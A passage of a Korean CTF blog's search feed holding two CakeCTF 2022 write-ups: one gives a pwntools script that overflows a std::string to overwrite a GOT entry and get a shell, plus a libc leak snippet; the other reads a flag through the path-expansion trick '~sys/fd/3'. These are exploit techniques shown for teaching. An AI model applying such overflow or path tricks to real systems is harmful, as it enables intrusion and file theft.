<code>std::string</code> 데이터를 get하거나 set(입력)하는 기능이 있는데, 이 때 (<code>_c_str</code> 뒤에 위치한) 포인터를 이용해서 접근한다.</p><p>우리는 여기서 GOT Overwriting을 통해 원하는 함수를 실행시킬 수 있다는 것을 눈치챌 수 있다.</p><p><code>call_me</code>라는 좋은 함수가 있으니 적당한 함수를 골라서 어떠한 got를 <code>call me</code> 로 덮어버리면 바로 쉘을 딸 수 있을 것 같다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>어떤 함수 got를 <code>call_me</code>로 덮을까.. 고민을 해보았다.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;choice: &quot;</span>;</span><br><span class="line">std::cin &gt;&gt; choice;</span><br></pre></td></tr></table></figure><p>기능 수행이 끝이 나면 어느 case문으로 갈 지 입력을 받는데,<br>해당 부분이 IDA에서</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">choice = <span class="number">0</span>;</span><br><span class="line">std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br></pre></td></tr></table></figure><p>이렇게 보여지고 있었다.</p><p><code>std::char_traits</code>의 got를 덮어버린다면..?</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_c_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x404048</span>)) <span class="comment"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</span></span><br><span class="line">set_str(p64(<span class="number">0x4016de</span>)) <span class="comment"># call_me</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>문제 풀 당시에 이것저것 해보다가 <code>std::string</code>이 저장되는 구조가 조금 이상한 것만 느끼고 자세히 보지는 않았었는데.. 지금 다시 보니 그때 느낀 게 틀린 것이 아니었음을 알게 되었다.</p><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><p>기본 구조는 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>디버거로 확인해보면 더 직관적으로 확인할 수 있다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search AAAAAAAAAAAAAAA</span><br><span class="line">[stack]         0x7ffd35bb1700 &#x27;AAAAAAAAAAAAAAA&#x27;</span><br><span class="line">pwndbg&gt; x/4gx 0x7ffd35bb1700-0x10</span><br><span class="line">0x7ffd35bb16f0:0x00007ffd35bb17000x000000000000000f</span><br><span class="line">0x7ffd35bb1700:0x41414141414141410x0041414141414141</span><br></pre></td></tr></table></figure><p>해당 문제를 예시로 들자면 값 <code>0x00007ffd35bb1700</code>가 저장된 주소 <code>0x7ffd35bb16f0</code>에 <code>std::char_traits</code>의 got를 쓴다.<br>그리고 해당 got에다가 <code>call_me</code>를 쓰면(GOT overwriting), 결론적으로 <code>std::char_traits</code>이 실행될 때 <code>call_me</code>가 실행된다.</p><p>다시 기본 구조로 돌아와서..Data Size가 16(0x10) 이상인 경우엔 특이하게 힙에 할당된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x7ffd375efe40</span><br><span class="line">0x7ffd375efe40:0x0000000001e23eb00x0000000000000010</span><br><span class="line">0x7ffd375efe50:0x000000000000001e0x0041414141414141</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000001e23eb0 - 0x10</span><br><span class="line">0x1e23ea0:0x00000000000000000x0000000000000031</span><br><span class="line">0x1e23eb0:0x41414141414141410x4141414141414141</span><br><span class="line">0x1e23ec0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1e23ed0:0x00000000000000000x000000000000f131</span><br><span class="line">0x1e23ee0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>사실 이 문제에서는 (익스하는데에는 안썼지만) 출력하는 기능도 존재하기 때문에 <code>std::string</code>의 기본 구조만 충분히 알고 있다면 leak도 가능하다.</p><p><code>_c_str</code>를 입력할 때 BOF를 이용하여 Data Pointer에 leak하고 싶은 주소 넣고 바로 뒤에 이어지는 Data Size에 8로 세팅해주면 된다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x4040c0</span>) + p64(<span class="number">8</span>))</span><br><span class="line">libc_base = get_str() - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br></pre></td></tr></table></figure><p>이런식으로 libc leak도 가능하고 pie leak도 가능할 것이다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732#%E5%9F%BA%E6%9C%AC%E6%A7%8B%E9%80%A0">ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2021&#x2F;11&#x2F;30&#x2F;235732#基本構造</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> CakeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - readme2022 (misc)</title>
      <link href="/220928-cakectf2022-readme2022/"/>
      <url>/220928-cakectf2022-readme2022/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Ubuntu 20.04<br>사용자 제공 파일: 소스코드(python)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found. If this message shows up&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    on the remote server, please report to amdin.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filepath = <span class="built_in">input</span>(<span class="string">&quot;filepath: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> filepath.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not start with &#x27;/&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not contain &#x27;..&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    filepath = os.path.expanduser(filepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&quot;[-] Could not open file&quot;</span>)</span><br></pre></td></tr></table></figure><p>제공된 server.py 소스코드 전문이다.</p><p>코드를 읽다보면 뭔가 핵심인 것 같은 부분을 찾을 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.expanduser(filepath)</span><br></pre></td></tr></table></figure><p><code>filepath</code>에 <code>~&lt;username&gt;</code>를 입력한다면 home 디렉토리 path가 바뀌게 되는데 이것을 이용하여 문제를 푸는 것이다.</p><p>소스코드가 제공되었으니까 filepath를 출력해서 확인해보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~</span><br><span class="line">/home/jir4vvit</span><br><span class="line">[-] Could not open file</span><br><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~test</span><br><span class="line">/home/test</span><br><span class="line">[-] Could not open file</span><br></pre></td></tr></table></figure><p>이런 느낌이다..</p><p><code>/etc/passwd</code>을 확인하면 아래와 같은 정보가 있는데,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>sys 사용자의 home 디렉토리가 <code>/dev</code>인 것을 알 수 있다.</p><p>더불어 문제에서 <code>/flag.txt</code>를 open하고 close하지 않았음으로 file descriptor가 계속 살아있음을 알 수 있다. (!)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py</span><br><span class="line">filepath: ~sys/fd/3</span><br><span class="line">flag&#123;fake_flag&#125;</span><br></pre></td></tr></table></figure><p>설명을 조금 추가하자면, 지금 sys 사용자의 홈 디렉토리로 변경되었으니 <code>/dev</code>가 filepath(homepath)가 되었고, 정확히는 <code>/dev/fd/3</code>에 접근한 것이다.</p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>개인적으로 재미있는 문제라고 생각되어 블로그에 꼭 기록하고 싶었다.</p><p>아, File Descriptor에 대한 설명은 나의 과거 <a href="https://jiravvit.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EB%94%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%84%B0-File-Descriptor">티스토리 블로그</a>에 있다. ㅎ</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CakeCTF </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
